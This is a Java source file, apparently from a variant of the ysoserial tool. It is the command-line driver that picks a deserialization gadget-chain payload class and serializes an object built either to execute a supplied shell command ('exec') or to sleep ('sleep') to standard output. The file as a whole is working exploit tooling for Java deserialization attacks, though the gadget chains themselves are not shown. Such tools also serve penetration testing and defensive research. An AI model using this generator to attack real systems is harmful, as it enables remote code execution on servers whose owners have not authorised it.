package ysoserial;

import java.io.ObjectOutputStream;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Collections;
import java.util.Comparator;
import java.util.List;
import java.util.Set;

import org.reflections.Reflections;

import ysoserial.payloads.ObjectPayload;

@SuppressWarnings("rawtypes")
public class GeneratePayload {

	private static final int INTERNAL_ERROR_CODE = 70;
	private static final int USAGE_CODE = 64;

	public static void main(final String[] args) {
		if (args.length != 3) {
			printUsage();
			System.exit(USAGE_CODE);
		}
		final String payloadType = args[0];
		final String payloadFunction = args[1];
		final String command = args[2];
		
		final Class<? extends ObjectPayload> payloadClass = getPayloadClass(payloadType);
		if (payloadClass == null || !ObjectPayload.class.isAssignableFrom(payloadClass)) {
			System.err.println("Invalid payload type '" + payloadType + "'");
			printUsage();
			System.exit(USAGE_CODE);
		}
		
		try {
			final ObjectPayload payload = payloadClass.newInstance();
			
			if(payloadFunction.equals("exec")) {
				final Object object = payload.getObjectExec(command);
				final ObjectOutputStream objOut = new ObjectOutputStream(System.out);
				objOut.writeObject(object);
			} else if(payloadFunction.equals("sleep")){
				if(!payloadType.equals("Groovy1")) {
					final Object object = payload.getObjectSleep(command);
					final ObjectOutputStream objOut = new ObjectOutputStream(System.out);
					objOut.writeObject(object);
				} else {
					System.err.println("Not implemented. Groovy1 has only exec payload for now.");
				}
			} else {
				printUsage();
				System.exit(USAGE_CODE);				
			}
			
		} catch (Throwable e) {
			System.err.println("Error while generating or serializing payload");
			e.printStackTrace();
			System.exit(INTERNAL_ERROR_CODE);
		}		
		System.exit(0);		
	}
	
	@SuppressWarnings("unchecked")
	private static Class<? extends ObjectPayload> getPayloadClass(final String className) {
		try {
			return (Class<? extends ObjectPayload>) Class.forName(className);				
		} catch (Exception e1) {		
		}
		try {
			return (Class<? extends ObjectPayload>) Class.forName(GeneratePayload.class.getPackage().getName() 
				+ ".payloads."  + className);
		} catch (Exception e2) {				
		}			
		return null;		
	}
	
	private static void printUsage() {
		System.err.println("Y SO SERIAL?");
		System.err.println("Usage: java -jar ysoserial-[version]-all.jar [payload type] [payload function] '[command to execute or time to sleep in milliseconds]'");
		System.err.println("\tAvailable payload types:");	
		final List<Class<? extends ObjectPayload>> payloadClasses = 
			new ArrayList<Class<? extends ObjectPayload>>(getPayloadClasses());
		Collections.sort(payloadClasses, new ToStringComparator()); // alphabetize
		for (Class<? extends ObjectPayload> payloadClass : payloadClasses) {
			System.err.println("\t\t" + payloadClass.getSimpleName());
		}
		System.err.println("\tAvailable payload functions:");
		System.err.println("\t\texec");
		System.err.println("\t\tsleep");
	}
	
	// get payload classes by classpath scanning
	private static Collection<Class<? extends ObjectPayload>> getPayloadClasses() {
		final Reflections reflections = new Reflections(GeneratePayload.class.getPackage().getName());
		final Set<Class<? extends ObjectPayload>> payloadTypes = reflections.getSubTypesOf(ObjectPayload.class);		
		return payloadTypes;
	}	

	public static class ToStringComparator implements Comparator<Object> {
		public int compare(Object o1, Object o2) { return o1.toString().compareTo(o2.toString()); }
	}	

}
